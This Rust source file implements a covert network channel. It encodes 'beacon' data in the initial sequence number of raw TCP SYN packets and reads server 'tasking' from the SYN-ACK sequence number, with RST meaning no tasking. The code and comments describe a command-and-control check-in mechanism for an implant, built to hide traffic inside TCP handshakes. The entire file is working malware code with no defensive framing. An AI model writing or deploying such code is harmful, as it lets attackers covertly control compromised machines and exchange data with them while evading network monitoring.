use std::io;
use std::net::Ipv4Addr;
use crate::raw_tcp::*;
use crate::sys;

pub struct RawChannel {
    src_port: u16,
    dst_ip: Ipv4Addr,
    dst_port: u16,
    local_ip: Ipv4Addr,
}

impl RawChannel {
    pub fn new(
        local_ip: Ipv4Addr,
        dst_ip: Ipv4Addr,
        dst_port: u16,
    ) -> Self {
        RawChannel {
            src_port: 0, // chosen per-connection
            dst_ip,
            dst_port,
            local_ip,
        }
    }

    fn random_source_port() -> u16 {
        let v = sys::rand_u64();
        1024 + ((v as u32) % (65536 - 1024)) as u16
    }

    /// Send a SYN with covert data in the ISN
    /// Returns the server's ISN (containing tasking) if SYN-ACK received
    /// Returns None if RST received (no tasking)
    pub fn check_in(&mut self, beacon_data: u32) -> Result<Option<u32>, io::Error> {
        let fd = create_raw_socket()?;
        self.src_port = Self::random_source_port();

        // Build SYN with covert ISN
        let syn = TcpHeader::new(
            self.src_port,
            self.dst_port,
            beacon_data,   // our covert data encoded in the sequence number
            0,
            TCP_SYN,
        );

        let syn_bytes = syn.to_bytes();
        let checksum = tcp_checksum(
            self.local_ip,
            self.dst_ip,
            &syn_bytes,
            &[],
        );

        // Set checksum at bytes 16-17
        let mut packet = syn_bytes;
        packet[16] = (checksum >> 8) as u8;
        packet[17] = (checksum & 0xFF) as u8;

        send_raw_packet(fd, self.dst_ip, self.dst_port, &packet)?;

        // wait for SYN-ACK or RST
        let mut recv_buf = [0u8; 4096];
        let timeout = 5000; // 5 seconds

        loop {
            match recv_raw_packet(fd, &mut recv_buf, timeout) {
                Ok(n) => {
                    if let Some((src_port, dst_port, seq, _ack, flags)) =
                        parse_response_header(&recv_buf[..n])
                    {
                        // Filter for our connection
                        if src_port != self.dst_port || dst_port != self.src_port {
                            continue;
                        }

                        if flags & (TCP_SYN | TCP_ACK) == (TCP_SYN | TCP_ACK) {
                            // SYN-ACK: server has tasking for us
                            // Server's ISN contains the tasking data
                            let server_data = seq;

                            // Send ACK to complete handshake
                            self.send_ack(fd, beacon_data + 1, seq + 1)?;

                            // Send FIN to close cleanly
                            self.send_fin(fd, beacon_data + 1, seq + 1)?;

                            unsafe { libc::close(fd); }
                            return Ok(Some(server_data));

                        } else if flags & TCP_RST != 0 {
                            // RST: no tasking, check back later
                            unsafe { libc::close(fd); }
                            return Ok(None);
                        }
                    }
                }
                Err(e) if e.kind() == io::ErrorKind::WouldBlock => {
                    // Timeout - no response
                    unsafe { libc::close(fd); }
                    return Ok(None);
                }
                Err(e) => {
                    unsafe { libc::close(fd); }
                    return Err(e);
                }
            }
        }
    }

    fn send_ack(
        &self,
        fd: i32,
        seq: u32,
        ack: u32,
    ) -> Result<(), io::Error> {
        let header = TcpHeader::new(
            self.src_port,
            self.dst_port,
            seq,
            ack,
            TCP_ACK,
        );

        let header_bytes = header.to_bytes();
        let checksum = tcp_checksum(
            self.local_ip,
            self.dst_ip,
            &header_bytes,
            &[],
        );

        let mut packet = header_bytes;
        packet[16] = (checksum >> 8) as u8;
        packet[17] = (checksum & 0xFF) as u8;

        send_raw_packet(fd, self.dst_ip, self.dst_port, &packet)?;
        Ok(())
    }

    fn send_fin(
        &self,
        fd: i32,
        seq: u32,
        ack: u32,
    ) -> Result<(), io::Error> {
        let header = TcpHeader::new(
            self.src_port,
            self.dst_port,
            seq,
            ack,
            TCP_FIN | TCP_ACK,
        );

        let header_bytes = header.to_bytes();
        let checksum = tcp_checksum(
            self.local_ip,
            self.dst_ip,
            &header_bytes,
            &[],
        );

        let mut packet = header_bytes;
        packet[16] = (checksum >> 8) as u8;
        packet[17] = (checksum & 0xFF) as u8;

        send_raw_packet(fd, self.dst_ip, self.dst_port, &packet)?;
        Ok(())
    }
}